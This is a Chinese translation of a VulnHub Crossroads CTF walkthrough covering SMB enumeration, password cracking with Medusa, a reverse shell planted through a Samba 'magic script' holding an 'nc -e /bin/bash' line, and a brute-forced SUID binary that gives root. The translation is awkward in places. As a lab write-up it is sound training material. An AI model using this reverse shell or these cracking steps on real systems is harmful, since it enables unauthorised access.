# VulnHub —十字路口漫游

> 原文：<https://infosecwriteups.com/vulnhub-crossroads-walkthrough-ab67c827bc5c?source=collection_archive---------1----------------------->

![](img/252a3bb64aa7334992a53740c61be8cb.png)

VulnHub Crossroads:1 是一个简单的 boot2root CTF 挑战，你必须利用 SMB 并获得用户和 root 标志。

让我们从查找虚拟机的 IP 开始。

![](img/2a79a3f41aef07ba3f0d91145a32426d.png)

Crossroads 虚拟机的 IP

然后，让我们执行传统的 Nmap 扫描。

![](img/afee6e603b0ed92273d4337d3321ce1c.png)

Nmap 扫描结果

你会遇到三个开放的港口，

*   端口 80 — HTTP
*   端口 139 —中小型企业
*   端口 445 —中小型企业

Web 应用不是一个侥幸的地方。我尝试了不同的攻击，如登录和注册表单上的 SQL 注入，但不成功。

![](img/c4ec161b51faea6917f229bb4c26f819.png)

网络应用

然后，我尝试暴力强制目录。

![](img/9f6cee65b1dcb9649acecd01a98c337d.png)

Gobuster 目录暴力破解

我可以找到两个隐藏的目录，

*   note.txt
*   robots.txt

我们来看看 robots.txt。

![](img/5b385116f98cf72c1bab90923aa4b975.png)

robots.txt

它指出了另一个名为 crossroads.png 的隐藏文件，所以让我们来看看这个图像。

![](img/ef7da89461d021cb74792b6aec56d921.png)

crossroads.png

好像没什么用。所以我们来看看 note.txt。

![](img/2346452dc8baa73b513a58aa28956634.png)

note.txt

它讲述了三种蓝调。我不知道那是什么意思，所以我谷歌了一下，找到了以下内容。

![](img/d96f072a01627f02f4565a7228ae19b2.png)

三首布鲁斯之王

这些名字可能是与我们的机器相关联的用户名的暗示。

由于 web 应用程序没有用，让我们用 enum4linux 列举 SMB 共享。

![](img/2abc6dae19614e7ade93a001aa065a62.png)

enum4linux

我们可以找到蓝调三大天王之一；阿尔伯特:)

![](img/2bc3c9dd18fad06f259f7ad0b869d884.png)

用户艾伯特

然后我试着破解了艾伯特的 SMB share 的密码。

使用九头蛇是一场噩梦，因为预计时间约为 40 小时。所以，我用了美杜莎。

![](img/61f99bed7d1d9aa86b34b89ccf4c9fd9.png)

用美杜莎破解艾伯特的密码

不到一分钟，我就找到了艾伯特的密码，名字是**布拉德利 1** 。

![](img/af94ad43e7fd142ecc7a2298e68a0145.png)

破解了艾伯特的密码

因此，让我们继续使用上述凭据登录 SMB 共享。

![](img/6cae91440ebf0edc7edfe99256348962.png)

中小企业股份 os albert

我们可以看到 3 个文件和一个名为 **smbshare** 的目录。

让我们使用 **get** 命令下载这 3 个文件。

![](img/bda6ae5204ed33e0d6c782188268861b.png)

下载文件

将目录更改为 **smbshare** 并下载 **smb.conf** 文件。

![](img/24458c7d375f2a5893fdf7a39a6c3f78.png)

从 smbshare 目录下载 smb.conf

现在我们有 4 个文件，

*   crossroads.png
*   贝鲁特
*   user.txt
*   中小企业网

让我们逐一检查下载的内容。

**user.txt** 包含第一个标志。

![](img/e42007f382f736b3dcb7b5d5dec6ce10.png)

用户标志

当我们检查 **smb.conf** 文件时，我们可以看到以下条目。

![](img/7209a7b216a7e8c99e0f7ac59b15591e.png)

中小企业网

有一个条目叫做**magic script = smsubscript . sh**。

我们可以创建一个名为**smubscript**的 shell 脚本，这样我们就可以反向连接到机器。

只需在 shell 脚本中添加 **nc -e /bin/bash <主机 IP > <主机端口>** ，执行时产生 netcat 反向 shell。

![](img/eeccb2cc0450e2b455a0e63d0df7acad.png)

smsubscript . sh

授予所有用户对脚本的读、写、可执行权限。

然后设置一个 netcat 监听器。

![](img/976eef5da9a6eedf2accc229575f8570.png)

netcat 监听器

神奇的脚本应该在 **smbshare 中执行。**那么，让我们以 albert 的身份登录 smbshare，并使用 **put** 命令上传我们的**smsubscript . sh**文件。

![](img/f2a29043f1b01e500adc6c72f8411688.png)

上传 smbscript.sh

看一下 netcat 监听器。我们得到了一个反壳。

![](img/701f4693f035d6c5f161406f9c7e27fa.png)

反向外壳

我们需要使接收到的哑壳稳定。你可以按照这些[指令](https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/)去做。

如果我们看一下 SUID 的二进制文件，我们可以看到, **beroot** 文件可以作为 root 运行。

![](img/48a89afc4d2a8bff9ccbac8c0aba4394.png)

SUID 双星

让我们来看看 beroot 文件。

![](img/6e71065a992fcd37c1c2b41b157dcdbb.png)

beroot 文件

我们可以清楚地了解到，它可以用来成为 root。那么，让我们继续运行这个文件。

![](img/46ac44e7d39c929d5f4afa642cda8b3c.png)

运行 beroot 文件

它要求一个我们不知道的密码。

![](img/2dbbd7dead476cc591f26e99dc6f771e.png)

beroot 要求输入密码

到目前为止，我们已经检查了 SMB 共享下载内容中的 3 个文件。只有图像**crossroads.png**留下来看。由于这是一幅图像，可能涉及速记。我们可以使用像 stegoveritas 这样的工具来检查我们的图像。

![](img/65f6ebdfde034c045b8b4645305d0537.png)

stegoveritas

扫描后，它生成一个名为**的新目录结果。**里面还有一个叫做 **keepers** 的目录。如果我们看一下第一个文件，我们会发现它是一个单词列表。我们可以尝试破解 beroot 文件的密码。

![](img/df52a9c5e79d6a50b8fe2c6ae54bf272.png)

单词表

让我们将它作为 **passwrds.txt** 复制到主目录。

![](img/58112e34a8fcf6c409a2297a92ca7958.png)

cat passwrds.txt

让我们使用 python 创建一个简单的 http 服务器，以便将我们的文件上传到受害者。

![](img/f0e7d98ee3e25e517dfc4f155f996382.png)

创建简单的 http 服务器

我们可以使用受害者中的 **wget** 来上传 passwrds.txt 文件。

![](img/72fd60a750d29edac96e9d67cfdb4a52.png)

wget http:// <host ip="">/</host>

现在，我们可以编写一个简单的 bash 脚本来遍历我们的密码列表，并暴力破解 beroot 的密码。

![](img/14f5ca6322a7e716994938f1675a20df.png)

暴力破解的 bash 脚本

向脚本(chmod +x)提供执行权限并执行它。

一旦完成，我们会得到另一个名为 **rootcreds** 的文件。

![](img/24d1197b1b1806716471caa65b29d3f5.png)

根证书

我们可以通过查看该文件来获取 root 用户的凭据。

![](img/8f7b881b9955dbdb8615379b4b2039b1.png)

根凭据

让我们继续将用户更改为 root，并提供上述凭据。

![](img/b152814834d290f84aabe7c83ba220cb.png)

成为根

瞧啊。！！我们是根！！！

我们可以从 root 的主目录中获得第二个标志。

![](img/8b9c51c410aa447e9043de21a0250a61.png)

根标志

我希望你喜欢这个挑战，也学到了一些东西。通过 [LinkedIn](https://www.linkedin.com/in/ravishanka-silva-a632351a0/) 联系我。

祝你在前方捕捉旗帜时好运！！！